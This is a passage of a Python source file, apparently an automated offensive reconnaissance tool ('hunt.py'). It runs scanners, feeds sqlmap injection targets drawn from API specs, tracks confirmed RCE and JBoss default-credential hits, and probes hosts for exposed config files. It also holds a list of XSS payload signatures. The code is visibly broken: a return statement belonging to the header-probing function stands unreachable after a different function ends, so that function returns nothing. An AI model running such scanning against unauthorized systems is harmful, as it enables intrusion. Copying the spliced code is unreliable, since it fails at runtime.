        lines.append("tomcat_put_candidates: " + ", ".join(put_allowed_hosts[:5]))
    if rce_confirmed_targets:
        lines.append("confirmed_rce_targets: " + ", ".join(rce_confirmed_targets[:5]))
    if jboss_exposed_targets:
        lines.append("jboss_exposed_targets: " + ", ".join(jboss_exposed_targets[:5]))
    if jboss_default_cred_targets:
        lines.append("jboss_default_cred_targets: " + ", ".join(jboss_default_cred_targets[:5]))
    return "\n".join(lines)


def _upload_artifact_summary(path: str) -> str:
    files = _dir_file_count(path)
    candidates = os.path.join(path, "upload_candidates.tsv")
    probes = os.path.join(path, "probe_results.txt")
    candidate_count = _line_count(candidates) if os.path.isfile(candidates) else 0
    probe_count = _line_count(probes) if os.path.isfile(probes) else 0
    strong_lines: list[str] = []
    top_urls: list[str] = []
    if os.path.isfile(probes):
        try:
            with open(probes, errors="ignore") as handle:
                for raw in handle:
                    line = raw.strip()
                    if not line:
                        continue
                    if "hints=" in line and "| hints=none |" not in line:
                        strong_lines.append(line)
        except OSError:
            pass
    if os.path.isfile(candidates):
        try:
            with open(candidates, errors="ignore") as handle:
                for raw in handle:
                    parts = raw.rstrip("\n").split("\t")
                    if len(parts) >= 2 and parts[1] not in top_urls:
                        top_urls.append(parts[1])
                    if len(top_urls) >= 5:
                        break
        except OSError:
            pass
    parts = [
        f"upload: dir {path} | files={files}",
        f"candidates={candidate_count}",
        f"probed={probe_count}",
        f"strong_signals={len(strong_lines)}",
    ]
    lines = [" | ".join(parts)]
    if top_urls:
        lines.append("upload_candidates: " + ", ".join(top_urls))
    if strong_lines:
        lines.append("upload_probe_signals: " + " || ".join(strong_lines[:3]))
    return "\n".join(lines)


def _brain_phase_complete(phase: str, success: bool, detail: str = "", artifacts: dict[str, str] | None = None) -> None:
    if not (_brain and _brain.enabled):
        return
    summary_parts = []
    if detail:
        summary_parts.append(detail)
    artifact_text = _artifact_summary(artifacts)
    if artifact_text:
        summary_parts.append("Artifacts:\n" + artifact_text)
    _brain.phase_complete(phase, success, "\n\n".join(summary_parts))


def run_cmd(
    cmd: str,
    cwd: str = None,
    timeout: int = 600,
    watch_file: str = None,
    watch_phase: str = None,
    watch_interval: int = WATCHDOG_INTERVAL,
    watch_max_stale: int = WATCHDOG_MAX_IDLE,
) -> tuple[bool, str]:
    try:
        if watch_file is not None:
            label = watch_phase or "COMMAND"
            started_at = datetime.now()
            started_label = started_at.strftime("%Y-%m-%d %H:%M:%S")
            env = _tool_env()

            proc = subprocess.Popen(
                cmd,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                stdin=subprocess.DEVNULL,
                cwd=cwd,
                env=env,
                text=True,
                preexec_fn=os.setsid,
            )
            log("info", f"START {label}: PID {proc.pid} @ {started_label}")
            log("info", f"Command: {cmd}")

            watchdog = ProcessWatchdog(
                proc, watch_file, phase=label,
                interval=watch_interval, max_stale=watch_max_stale,
                command=cmd, effective_path=env.get("PATH", ""),
            )

            timed_out = False
            stdout = ""
            stderr = ""
            try:
                import select as _select
                deadline = time.time() + timeout
                chunks: list[str] = []
                while True:
                    remaining = deadline - time.time()
                    if remaining <= 0:
                        raise subprocess.TimeoutExpired(cmd, timeout)
                    if proc.stdout:
                        ready, _, _ = _select.select([proc.stdout], [], [], min(0.5, remaining))
                        if ready:
                            chunk = proc.stdout.read(4096)
                            if chunk:
                                chunks.append(chunk)
                    if proc.poll() is not None:
                        break
                if proc.stdout:
                    tail = proc.stdout.read()
                    if tail:
                        chunks.append(tail)
                stdout = "".join(chunks)
            except subprocess.TimeoutExpired:
                timed_out = True
                log("warn", f"{label}: timeout after {timeout}s — killing PID {proc.pid}")
                try:
                    os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
                except Exception:
                    proc.kill()
                stdout, _ = proc.communicate()
            finally:
                watchdog.stop()

            finished_at = datetime.now()
            duration = (finished_at - started_at).total_seconds()
            rc = proc.returncode if proc.returncode is not None else -1
            end_level = "ok" if rc == 0 else "warn"
            timeout_note = " (timed out)" if timed_out else ""
            log(end_level, f"END {label}: PID {proc.pid} rc={rc} duration={duration:.1f}s{timeout_note}")
            return rc == 0, (stdout or "") + (stderr or "")

        proc = subprocess.Popen(
            cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            stdin=subprocess.DEVNULL,
            cwd=cwd, env=_tool_env(), text=True,
            preexec_fn=os.setsid,
        )
        try:
            stdout, _ = proc.communicate(timeout=timeout)
        except subprocess.TimeoutExpired:
            try:
                os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
            except Exception:
                proc.kill()
            proc.wait()
            return False, "Command timed out"
        return proc.returncode == 0, stdout or ""
    except Exception as exc:
        return False, str(exc)


def run_cmd_args(
    args: list[str],
    cwd: str = None,
    timeout: int = 600,
) -> tuple[bool, str]:
    try:
        result = subprocess.run(
            args,
            capture_output=True,
            text=True,
            stdin=subprocess.DEVNULL,
            cwd=cwd,
            timeout=timeout,
            env=_tool_env(),
        )
        return result.returncode == 0, (result.stdout or "") + (result.stderr or "")
    except subprocess.TimeoutExpired:
        return False, "Command timed out"
    except Exception as exc:
        return False, str(exc)


def run_live(cmd: str, timeout: int = 3600,
             watch_file: str = None, watch_phase: str = None,
             watch_interval: int = WATCHDOG_INTERVAL,
             watch_max_stale: int = WATCHDOG_MAX_IDLE) -> bool:
    """
    Run cmd in a subprocess, streaming output live.
    If watch_file is given, attach a ProcessWatchdog that kills the process
    if the file stops growing for watch_max_stale × watch_interval seconds.
    """
    try:
        label = watch_phase or "SUBPROCESS"
        started_at = datetime.now()
        started_label = started_at.strftime("%Y-%m-%d %H:%M:%S")
        env = _tool_env()

        # Use os.setsid so watchdog can kill the whole process group
        proc = subprocess.Popen(cmd, shell=True, preexec_fn=os.setsid, env=env)
        log("info", f"START {label}: PID {proc.pid} @ {started_label}")
        log("info", f"Command: {cmd}")

        watchdog = None
        if watch_file is not None:
            phase = watch_phase or "SUBPROCESS"
            watchdog = ProcessWatchdog(
                proc, watch_file, phase=phase,
                interval=watch_interval, max_stale=watch_max_stale,
                command=cmd, effective_path=env.get("PATH", ""),
            )

        timed_out = False
        try:
            proc.wait(timeout=timeout)
        except subprocess.TimeoutExpired:
            timed_out = True
            log("warn", f"{label}: timeout after {timeout}s — killing PID {proc.pid}")
            try:
                os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
            except Exception:
                proc.kill()
        finally:
            if watchdog:
                watchdog.stop()

        finished_at = datetime.now()
        duration = (finished_at - started_at).total_seconds()
        rc = proc.returncode if proc.returncode is not None else -1
        end_level = "ok" if rc == 0 else "warn"
        timeout_note = " (timed out)" if timed_out else ""
        log(end_level, f"END {label}: PID {proc.pid} rc={rc} duration={duration:.1f}s{timeout_note}")
        return rc == 0

    except Exception as exc:
        log("err", f"run_live error: {exc}")
        return False


def _which(binary: str) -> bool:
    """Return True if binary exists on disk (absolute path) or in PATH."""
    if os.path.isfile(binary):
        if os.access(binary, os.X_OK):
            return True
        if binary.endswith(".py") and os.access(binary, os.R_OK):
            return True
    if os.path.sep not in binary:
        go_candidate = os.path.join(GOBIN, binary)
        if os.path.isfile(go_candidate) and os.access(go_candidate, os.X_OK):
            return True
    return shutil.which(binary) is not None


# ── Lightpanda helpers ─────────────────────────────────────────────────────────
_LP_BIN = os.path.join(TOOLS_DIR, "lightpanda", "lightpanda")

def _lightpanda_bin() -> str | None:
    """Return path to lightpanda binary if installed and executable."""
    if os.path.isfile(_LP_BIN) and os.access(_LP_BIN, os.X_OK):
        return _LP_BIN
    # Also check PATH (e.g. if user installed manually)
    found = shutil.which("lightpanda")
    return found or None


def _install_lightpanda() -> bool:
    """
    Auto-download the lightpanda nightly binary for the current platform.
    Saves to ~/tools/lightpanda/lightpanda.
    Returns True on success.
    """
    import platform, urllib.request

    machine = platform.machine().lower()   # x86_64, arm64, aarch64
    system  = platform.system().lower()    # linux, darwin

    if system == "darwin":
        arch = "aarch64" if machine in ("arm64", "aarch64") else "x86_64"
        fname = f"lightpanda-{arch}-macos"
    elif system == "linux":
        arch = "aarch64" if machine in ("aarch64",) else "x86_64"
        fname = f"lightpanda-{arch}-linux"
    else:
        log("warn", f"lightpanda: unsupported platform {system}/{machine} (use Docker: lightpanda/browser:nightly)")
        return False

    url = f"https://github.com/lightpanda-io/browser/releases/download/nightly/{fname}"
    dest_dir = os.path.join(TOOLS_DIR, "lightpanda")
    os.makedirs(dest_dir, exist_ok=True)
    dest = os.path.join(dest_dir, "lightpanda")

    log("info", f"Downloading lightpanda from {url} → {dest}")
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "hunt.py/1.0"})
        with urllib.request.urlopen(req, timeout=60) as resp, open(dest, "wb") as fp:
            fp.write(resp.read())
        os.chmod(dest, 0o755)
        log("ok", f"lightpanda installed → {dest}")
        return True
    except Exception as e:
        log("warn", f"lightpanda download failed: {e}")
        log("info", f"Manual install: curl -L -o {dest} {url} && chmod +x {dest}")
        return False


def _lightpanda_fetch_forms(url: str, cookies: str = "",
                             headers: dict | None = None,
                             timeout: int = 20) -> list[dict]:
    """
    Use lightpanda `fetch` to get JS-rendered HTML, then parse all <form> elements.
    Returns list of dicts: {action, method, inputs: [name, ...]}

    Falls back to plain requests if lightpanda is unavailable.
    """
    from html.parser import HTMLParser

    class _FormParser(HTMLParser):
        def __init__(self):
            super().__init__()
            self.forms:   list[dict] = []
            self._cur:    dict | None = None

        def handle_starttag(self, tag, attrs):
            a = dict(attrs)
            if tag == "form":
                self._cur = {
                    "action": a.get("action", ""),
                    "method": (a.get("method", "GET")).upper(),
                    "inputs": [],
                }
                self.forms.append(self._cur)
            elif tag in ("input", "select", "textarea") and self._cur is not None:
                name = a.get("name", "")
                if name:
                    self._cur["inputs"].append(name)

        def handle_endtag(self, tag):
            if tag == "form":
                self._cur = None

    lp = _lightpanda_bin()
    html_content = ""

    if lp:
        # Build env for cookies/headers
        env_extra: dict = {}
        cmd_parts = [lp, "fetch", "--log_level", "warn"]
        if cookies:
            cmd_parts += ["--header", f"Cookie: {cookies}"]
        for k, v in (headers or {}).items():
            cmd_parts += ["--header", f"{k}: {v}"]
        cmd_parts.append(url)

        try:
            result = subprocess.run(
                cmd_parts,
                capture_output=True, text=True, timeout=timeout,
            )
            html_content = result.stdout
            if result.returncode != 0 and not html_content:
                log("warn", f"lightpanda fetch error on {url}: {result.stderr[:200]}")
        except subprocess.TimeoutExpired:
            log("warn", f"lightpanda fetch timeout on {url}")
        except Exception as e:
            log("warn", f"lightpanda fetch exception on {url}: {e}")
    else:
        # Fallback: plain HTTP GET (no JS rendering)
        import urllib.request
        try:
            req_headers = {"User-Agent": "Mozilla/5.0"}
            if cookies:
                req_headers["Cookie"] = cookies
            for k, v in (headers or {}).items():
                req_headers[k] = v
            req = urllib.request.Request(url, headers=req_headers)
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                html_content = resp.read().decode("utf-8", errors="replace")
        except Exception as e:
            log("warn", f"HTTP fallback fetch failed on {url}: {e}")

    if not html_content:
        return []

    parser = _FormParser()
    try:
        parser.feed(html_content)
    except Exception:
        pass
    return parser.forms


# ── Tool checks ────────────────────────────────────────────────────────────────
def check_tools() -> tuple[list, list]:
    installed, missing = [], []
    for name, binary, _ in TOOL_REGISTRY:
        (_installed if _which(binary) else missing).append(name) if False else None
        if _which(binary):
            installed.append(name)
        else:
            missing.append(name)
    return installed, missing


def _file_nonempty(path: str) -> bool:
    return os.path.isfile(path) and os.path.getsize(path) > 0


def _dir_has_files(path: str) -> bool:
    if not os.path.isdir(path):
        return False
    for _, _, files in os.walk(path):
        if files:
            return True
    return False


def _line_count(path: str) -> int:
    if not os.path.isfile(path):
        return 0
    try:
        with open(path, errors="ignore") as fh:
            return sum(1 for line in fh if line.strip())
    except OSError:
        return 0


def _read_text(path: str) -> str:
    if not os.path.isfile(path):
        return ""
    try:
        with open(path, errors="ignore") as fh:
            return fh.read()
    except OSError:
        return ""


# Signals that an URL's query-string already contains a payload left by a
# previous tester / crawler (dalfox PoCs frequently land in gau/wayback).
# Feeding these to sqlmap wastes probes trying to inject around them. (v7.1.4)
_PAYLOAD_QUERY_SIGNALS: tuple[str, ...] = (
    "<script", "</script", "onerror=", "onauxclick=", "onclick=", "onload=",
    "onbegin=", "ontoggle=", "onstart=", "srcdoc=", "javascript:", "alert(",
    "confirm(", "prompt(", "<iframe", "<svg", "<img", "javascript%3a",
)

# Matches an URL-encoded ``<tag`` sequence (``%3C`` = ``<``) — catches arbitrary
# HTML tags left in query values, not just the few listed above. Case-insensitive
# via inline ``(?i)`` because URL encodings mix cases in the wild.
import re as _re_module  # local alias; hunt.py already imports re above
_PAYLOAD_ENCODED_TAG_RE = _re_module.compile(r"(?i)%3c[a-z/]")


def _looks_like_payload_url(url: str) -> bool:
    """True if the URL's query or path already carries an injection payload.

    Cheap heuristic — case-insensitive substring match on known JS-sink /
    XSS / SQLi signatures, plus a regex for URL-encoded ``<tag`` openers.
    Skipping these before feeding sqlmap avoids the cross-phase
    contamination observed on testfire.net where dalfox PoCs crawled back
    into ``urls/with_params.txt`` and became SQLi candidates.
    """
    lower = url.lower()
    if any(sig in lower for sig in _PAYLOAD_QUERY_SIGNALS):
        return True
    return bool(_PAYLOAD_ENCODED_TAG_RE.search(lower))


def _collect_urls_from_file(path: str, *, require_query: bool = False,
                            strip_query: bool = False, limit: int | None = None,
                            filter_payloads: bool = False) -> list[str]:
    urls: list[str] = []
    seen: set[str] = set()
    if not os.path.isfile(path):
        return urls
    try:
        with open(path, errors="ignore") as fh:
            for raw in fh:
                candidate = raw.strip()
                if not candidate.startswith(("http://", "https://")):
                    continue
                if require_query and "?" not in candidate:
                    continue
                if filter_payloads and _looks_like_payload_url(candidate):
                    continue
                parsed = urlsplit(candidate)
                if not parsed.scheme or not parsed.netloc:
                    continue
                normalized = candidate
                if strip_query:
                    path_part = parsed.path or "/"
                    normalized = f"{parsed.scheme}://{parsed.netloc}{path_part}"
                if normalized in seen:
                    continue
                seen.add(normalized)
                urls.append(normalized)
                if limit is not None and len(urls) >= limit:
                    break
    except OSError:
        return urls
    return urls


def _collect_openapi_post_endpoints(recon_dir: str, *,
                                     limit: int = 30) -> list[dict]:
    """Extract ``{url, method, json_body}`` for every POST/PUT/PATCH operation
    api_audit.py has already discovered in ``recon_dir/api_specs/``.

    Two parse paths (v7.1.7):

    1. **Primary** — ``operations.json`` (list of pre-parsed op dicts).
       api_audit.py writes this with ``{method, path, sample_url,
       parameters, requires_auth, ...}`` already extracted across every
       spec it found. Cheaper + correct — no need to re-walk specs.

    2. **Fallback** — raw OpenAPI/Swagger spec files saved as
       ``<host>_<hash>.json``. Only used when ``operations.json`` is
       absent; skips files that aren't actually spec dicts (the other
       ``*.json`` artefacts in the dir — ``discovered_specs.json``,
       ``unauth_findings.json`` — are both lists, which in v7.1.6 caused
       ``AttributeError: 'list' object has no attribute 'get'`` and
       crashed the whole SQLMAP phase).

    The body-schema walker is intentionally dumb — it generates a flat
    ``"test"`` value for every property so sqlmap has material to fuzz.
    Pinning a richer schema walk would be nice but "param-present" is all
    the boolean-blind detection actually needs.
    """
    import glob as _glob

    specs_dir = os.path.join(recon_dir, "api_specs")
    if not os.path.isdir(specs_dir):
        return []

    endpoints: list[dict] = []
    seen_targets: set[tuple[str, str]] = set()

    def _sample_body(schema, definitions):
        # Follow a single $ref hop. Anything deeper falls through to an
        # empty object — sqlmap still gets "something" to inject into.
        if not isinstance(schema, dict):
            return {}
        if "$ref" in schema:
            ref = schema["$ref"].split("/")[-1]
            schema = definitions.get(ref, {}) if isinstance(definitions, dict) else {}
            if not isinstance(schema, dict):
                return {}
        props = schema.get("properties") or {}
        if isinstance(props, dict) and props:
            return {name: "test" for name in props}
        return {}

    # v7.1.9 — pre-load every raw OpenAPI spec in the dir into an index
    # keyed by (path, method). api_audit.py's ``operations.json`` drops
    # the body schema (it only remembers ``in:body`` / ``name:body``),
    # which is useless to sqlmap — we need the real property names so
    # ``--data='{"username":"…","password":"…"}'`` actually reaches the
    # injectable field. The raw specs DO carry the schema via ``$ref``,
    # so index them up front and look up body params per operation.
    _spec_op_index: dict[tuple[str, str], dict] = {}
    for spec_path in _glob.glob(os.path.join(specs_dir, "*.json")):
        base = os.path.basename(spec_path)
        if base in ("discovered_specs.json", "operations.json",
                    "unauth_findings.json"):
            continue
        try:
            raw_spec = json.load(open(spec_path))
        except Exception:
            continue
        if not isinstance(raw_spec, dict) or "paths" not in raw_spec:
            continue
        defs = raw_spec.get("definitions") or {}
        if not defs:
            defs = (raw_spec.get("components") or {}).get("schemas") or {}
        for op_path, ops_dict in (raw_spec.get("paths") or {}).items():
            if not isinstance(ops_dict, dict):
                continue
            for m, meta in ops_dict.items():
                if isinstance(meta, dict):
                    _spec_op_index[(op_path, m.lower())] = {
                        "meta": meta, "definitions": defs,
                    }

    def _body_from_spec(path: str, method: str) -> dict:
        """Resolve the ``$ref`` body schema for ``(path, method)``."""
        entry = _spec_op_index.get((path, method.lower()))
        if not entry:
            return {}
        meta, defs = entry["meta"], entry["definitions"]
        # Swagger 2.0 ``parameters[in=body]`` + OpenAPI 3 ``requestBody.content``.
        for p in (meta.get("parameters") or []):
            if isinstance(p, dict) and p.get("in") == "body":
                return _sample_body(p.get("schema") or {}, defs)
        if isinstance(meta.get("requestBody"), dict):
            rb = meta["requestBody"].get("content") or {}
            for _ct, val in rb.items():
                if isinstance(val, dict):
                    body = _sample_body(val.get("schema") or {}, defs)
                    if body:
                        return body
        # formData fallback (non-JSON multipart/urlencoded APIs)
        form = {p.get("name"): "test"
                for p in (meta.get("parameters") or [])
                if isinstance(p, dict)
                and p.get("in") == "formData"
                and p.get("name")}
        return form

    # ── Path 1: operations.json (api_audit.py's pre-parsed output) ─────
    ops_json = os.path.join(specs_dir, "operations.json")
    if os.path.isfile(ops_json):
        try:
            ops = json.load(open(ops_json))
        except Exception:
            ops = []
        if isinstance(ops, list):
            for op in ops:
                if not isinstance(op, dict):
                    continue
                method = str(op.get("method", "")).upper()
                if method not in ("POST", "PUT", "PATCH"):
                    continue
                url = op.get("sample_url") or op.get("url") or ""
                if not url.startswith(("http://", "https://")):
                    continue
                key = (method, url)
                if key in seen_targets:
                    continue
                # v7.1.9 — resolve body schema from the raw spec first; it has
                # the $ref expansion that operations.json dropped.
                body = _body_from_spec(op.get("path", ""), method)
                # Legacy fallback: operations.json parameters flat listing
                # (unlikely to have body field names, but cheap to try).
                if not body:
                    for p in (op.get("parameters") or []):
                        if isinstance(p, dict) and p.get("in") in ("body", "formData"):
                            name = p.get("name") or ""
                            if name and name != "body":
                                body[name] = "test"
                if not body:
                    body = {"test": "1"}
                endpoints.append({
                    "url": url,
                    "method": method,
                    "json_body": body,
                })
                seen_targets.add(key)
                if len(endpoints) >= limit:
                    return endpoints

    # ── Path 2: raw spec files (only if operations.json was empty) ─────
    if endpoints:
        return endpoints

    for path in sorted(_glob.glob(os.path.join(specs_dir, "*.json"))):
        if os.path.basename(path) in (
            "discovered_specs.json",   # list of meta dicts, not a spec
            "unauth_findings.json",    # list
            "operations.json",         # already consumed above
        ):
            continue
        try:
            spec = json.load(open(path))
        except Exception:
            continue
        # Defensive: skip any payload that isn't an OpenAPI-shaped dict.
        # The v7.1.7 AttributeError came from exactly this.
        if not isinstance(spec, dict) or "paths" not in spec:
            continue
        host = spec.get("host") or ""
        base_path = spec.get("basePath") or ""
        schemes_val = spec.get("schemes")
        scheme = schemes_val[0] if isinstance(schemes_val, list) and schemes_val else "https"
        defs = spec.get("definitions") or {}
        if not host and isinstance(spec.get("servers"), list) and spec["servers"]:
            server0 = spec["servers"][0]
            if isinstance(server0, dict):
                from urllib.parse import urlparse as _up
                p = _up(server0.get("url", ""))
                if p.netloc:
                    host = p.netloc
                    base_path = p.path or ""
                    scheme = p.scheme or scheme
        defs = defs or ((spec.get("components") or {}).get("schemas") or {})

        for op_path, ops in (spec.get("paths") or {}).items():
            if not isinstance(ops, dict):
                continue
            for method, meta in ops.items():
                if not isinstance(meta, dict):
                    continue
                if method.lower() not in ("post", "put", "patch"):
                    continue
                full = f"{scheme}://{host}{base_path}{op_path}"
                key = (method.lower(), full)
                if key in seen_targets:
                    continue
                body = {}
                for p in (meta.get("parameters") or []):
                    if isinstance(p, dict) and p.get("in") == "body":
                        body = _sample_body(p.get("schema") or {}, defs)
                        break
                if not body and isinstance(meta.get("requestBody"), dict):
                    rb = meta["requestBody"].get("content") or {}
                    for _ct, val in rb.items():
                        if isinstance(val, dict):
                            body = _sample_body(val.get("schema") or {}, defs)
                            if body:
                                break
                endpoints.append({
                    "url": full,
                    "method": method.upper(),
                    "json_body": body,
                })
                seen_targets.add(key)
                if len(endpoints) >= limit:
                    return endpoints
    return endpoints


def _load_json(path: str, default):
    if not os.path.isfile(path):
        return default
    try:
        with open(path) as fh:
            return json.load(fh)
    except Exception:
        return default


def _write_json(path: str, data: dict) -> None:
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w") as fh:
        json.dump(data, fh, indent=2)


def _target_state_path(domain: str) -> str:
    return os.path.join(TARGETS_DIR, domain, "target_state.json")


def _default_target_state(domain: str) -> dict:
    return {
        "target": domain,
        "created_at": datetime.now().isoformat(timespec="seconds"),
        "updated_at": datetime.now().isoformat(timespec="seconds"),
        "last_session_id": None,
        "waf_hosts": [],
        "rate_limit_hint": None,
        "reported_finding_hashes": [],
        "historical_cve_hits": {},
        "known_exposed_paths": {},
    }


def _load_target_state(domain: str) -> dict:
    state = _load_json(_target_state_path(domain), _default_target_state(domain))
    if not isinstance(state, dict):
        state = _default_target_state(domain)
    state.setdefault("target", domain)
    state.setdefault("created_at", datetime.now().isoformat(timespec="seconds"))
    state.setdefault("updated_at", datetime.now().isoformat(timespec="seconds"))
    state.setdefault("last_session_id", None)
    state.setdefault("waf_hosts", [])
    state.setdefault("rate_limit_hint", None)
    state.setdefault("reported_finding_hashes", [])
    state.setdefault("historical_cve_hits", {})
    state.setdefault("known_exposed_paths", {})
    return state


def _save_target_state(domain: str, state: dict) -> None:
    state["target"] = domain
    state["updated_at"] = datetime.now().isoformat(timespec="seconds")
    _write_json(_target_state_path(domain), state)


def _normalize_base_url(url: str) -> str:
    parsed = urlsplit((url or "").strip())
    if not parsed.scheme or not parsed.netloc:
        return ""
    return f"{parsed.scheme}://{parsed.netloc}"


def _extract_urls(text: str) -> list[str]:
    return [
        match.rstrip('\'"),]}')
        for match in re.findall(r'https?://[^\s<>"\']+', text or "")
    ]


def _looks_textual_content_type(content_type: str, body: bytes = b"") -> bool:
    """Check if content is text-like. Falls back to Magika when header is ambiguous."""
    lowered = (content_type or "").lower()
    if any(token in lowered for token in (
        "javascript", "json", "text/plain", "text/html", "text/xml",
        "application/xml",
    )):
        return True
    # Header says binary/octet-stream or missing — let Magika decide from body
    if body and lowered in ("application/octet-stream", ""):
        try:
            from file_classifier import get_classifier
            return get_classifier().is_text_like(body)
        except Exception:
            pass  # Magika not installed — fall back to header-only
    return False


def _probe_url_headers(url: str, timeout: int = 6) -> tuple[int, str]:
    try:
        proc = subprocess.run(
            ["curl", "-sk", "-o", "/dev/null", "-D", "-", "--max-time", str(timeout), url],
            capture_output=True,
            text=True,
            timeout=timeout + 2,
            check=False,
        )
    except Exception:
        return 0, ""

    status = 0
    content_type = ""
    for line in (proc.stdout or "").splitlines():
        if line.upper().startswith("HTTP/"):
            parts = line.split()
            if len(parts) >= 2 and parts[1].isdigit():
                status = int(parts[1])
        elif line.lower().startswith("content-type:"):
            content_type = line.split(":", 1)[1].strip()


def _classify_exposed_file(url: str, domain: str, session_id: str | None = None,
                           timeout: int = 6) -> str | None:
    """Download first 8KB of an exposed URL and classify with Magika.

    Returns a finding line if an executable/dangerous file type is detected,
    or None if the file is benign or Magika is unavailable.
    """
    try:
        from file_classifier import get_classifier
    except ImportError:
        return None

    try:
        proc = subprocess.run(
            ["curl", "-sk", "--max-time", str(timeout), "-r", "0-8191", url],
            capture_output=True, timeout=timeout + 2, check=False,
        )
    except Exception:
        return None

    body = proc.stdout
    if not body or len(body) < 16:
        return None

    try:
        fc = get_classifier()
        result = fc.classify_bytes(body)
    except Exception:
        return None

    if result.risk_tier == "critical":
        return (f"[CRITICAL] Executable file exposed: {url} "
                f"→ true type: {result.true_type} ({result.mime}, "
                f"confidence: {result.confidence:.0%})")
    elif result.risk_tier == "high" and result.mismatch:
        return (f"[HIGH] Suspicious file type mismatch: {url} "
                f"→ true type: {result.true_type} ({result.mime}), "
                f"claimed: {result.claimed_mime or 'unknown'}")
    return None
    return status, content_type


def _update_known_exposed_paths_from_file(state: dict, path: str) -> None:
    if not os.path.isfile(path):
        return
    known = state.setdefault("known_exposed_paths", {})
    try:
        content = open(path, errors="ignore").read()
    except OSError:
        return
    for url in _extract_urls(content):
        parsed = urlsplit(url)
        if not parsed.path or parsed.path == "/":
            continue
        hosts = set(known.get(parsed.path, []))
        hosts.add(_normalize_base_url(url))
        known[parsed.path] = sorted(h for h in hosts if h)


def _update_target_state_from_artifacts(domain: str, session_id: str | None = None) -> dict:
    state = _load_target_state(domain)
    recon_dir = _resolve_recon_dir(domain, session_id=session_id)
    findings_dir = _resolve_findings_dir(domain, session_id=session_id)
    state["last_session_id"] = session_id

    waf_hosts = set(state.get("waf_hosts", []))
    live_count = _line_count(os.path.join(recon_dir, "live", "urls.txt"))
    rate_limited = _extract_urls(_read_text(os.path.join(recon_dir, "live", "status_429.txt")))
    for url in rate_limited:
        base = _normalize_base_url(url)
        if base:
            waf_hosts.add(base)
    state["waf_hosts"] = sorted(waf_hosts)

    if live_count > 0 and rate_limited:
        ratio = len(rate_limited) / max(live_count, 1)
        if ratio >= 0.40:
            state["rate_limit_hint"] = 40
        elif ratio >= 0.20:
            state["rate_limit_hint"] = 75

    historical_cves = state.setdefault("historical_cve_hits", {})
    for rel in ("cves/nuclei_cve_confirmed.txt", "cves/nuclei_cves_all.txt"):
        path = os.path.join(findings_dir, rel)
        if not os.path.isfile(path):
            continue
        try:
            lines = open(path, errors="ignore").read().splitlines()
        except OSError:
            continue
        for line in lines:
            urls = _extract_urls(line)
            if not urls:
                continue
            template = ""
            match = re.search(r"\[([A-Za-z0-9._:-]+)\]", line)
            if match:
                template = match.group(1)
            host = urlsplit(urls[0]).netloc
            if not host:
                continue
            entries = set(historical_cves.get(host, []))
            if template:
                entries.add(template)
            historical_cves[host] = sorted(entries)

    for rel in (
        "exposure/config_files.txt",
        "exposure/verified_sensitive.txt",
        "exposure/propagated_config_hits.txt",
    ):
        _update_known_exposed_paths_from_file(state, os.path.join(recon_dir, rel))
        _update_known_exposed_paths_from_file(state, os.path.join(findings_dir, rel))

    _save_target_state(domain, state)
    return state


def _adaptive_runtime_overrides(domain: str) -> dict[str, str]:
    state = _load_target_state(domain)
    rate = state.get("rate_limit_hint")
    if not isinstance(rate, int) or rate <= 0:
        return {}
    threads = 12 if rate <= 50 else 20
    return {
        "RATE_LIMIT_OVERRIDE": str(rate),
        "THREADS_OVERRIDE": str(threads),
    }


def _shell_env_prefix(env_map: dict[str, str]) -> str:
    if not env_map:
        return ""
    return " ".join(f'{key}={shlex.quote(str(value))}' for key, value in env_map.items()) + " "


def _propagate_exposed_paths(domain: str, session_id: str | None = None, limit_paths: int = 20, max_workers: int = 12) -> int:
    recon_dir = _resolve_recon_dir(domain, session_id=session_id)
    findings_dir = _resolve_findings_dir(domain, session_id=session_id, create=True)
    live_file = os.path.join(recon_dir, "live", "urls.txt")
    if not os.path.isfile(live_file):
        return 0

    live_hosts: list[str] = []
    seen_hosts: set[str] = set()
    try:
        for raw in open(live_file, errors="ignore"):
            base = _normalize_base_url(raw.strip())
            if base and base not in seen_hosts:
                seen_hosts.add(base)
                live_hosts.append(base)
    except OSError:
        return 0
    if not live_hosts:
        return 0

    source_paths: dict[str, set[str]] = {}
    for rel in (
        ("recon", "exposure/config_files.txt"),
        ("findings", "exposure/verified_sensitive.txt"),
        ("findings", "exposure/config_files.txt"),
    ):
        base_dir = recon_dir if rel[0] == "recon" else findings_dir
        path = os.path.join(base_dir, rel[1])
        if not os.path.isfile(path):
            continue
        try:
            content = open(path, errors="ignore").read()
        except OSError:
            continue
        for url in _extract_urls(content):
            parsed = urlsplit(url)
            if not parsed.path or parsed.path == "/":
                continue
            source_paths.setdefault(parsed.path, set()).add(_normalize_base_url(url))

    if not source_paths:
        return 0

    ranked_paths = sorted(
        source_paths.items(),
        key=lambda item: (-len(item[1]), item[0]),
    )[:max(1, limit_paths)]

    out_dir = os.path.join(findings_dir, "exposure")
    os.makedirs(out_dir, exist_ok=True)
    out_file = os.path.join(out_dir, "propagated_config_hits.txt")
    existing = set()
    if os.path.isfile(out_file):
        try:
            existing = {line.strip() for line in open(out_file, errors="ignore") if line.strip()}
        except OSError:
            existing = set()

    tasks: list[tuple[str, str, str, str]] = []
    for path_value, source_bases in ranked_paths:
        sources = ",".join(sorted(source_bases)[:3])
        for base in live_hosts:
            if base in source_bases:
                continue
            tasks.append((path_value, base, f"{base.rstrip('/')}{path_value}", sources))

    def worker(item: tuple[str, str, str, str]) -> str | None:
        path_value, _base, url, sources = item
        status, content_type = _probe_url_headers(url)
        if status == 200 and _looks_textual_content_type(content_type):
            return f"[PROPAGATED] path={path_value} url={url} sources={sources}"
        # Magika deep-classify: detect exposed executables/webshells
        if status == 200:
            magika_hit = _classify_exposed_file(url, domain, session_id=session_id)
            if magika_hit:
                return magika_hit
        return None

    hits: list[str] = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as pool:
        for output in pool.map(worker, tasks):
            if output and output not in existing:
                existing.add(output)
                hits.append(output)

    if hits:
        with open(out_file, "a") as fh:
            for line in hits:
                fh.write(line + "\n")
        state = _load_target_state(domain)
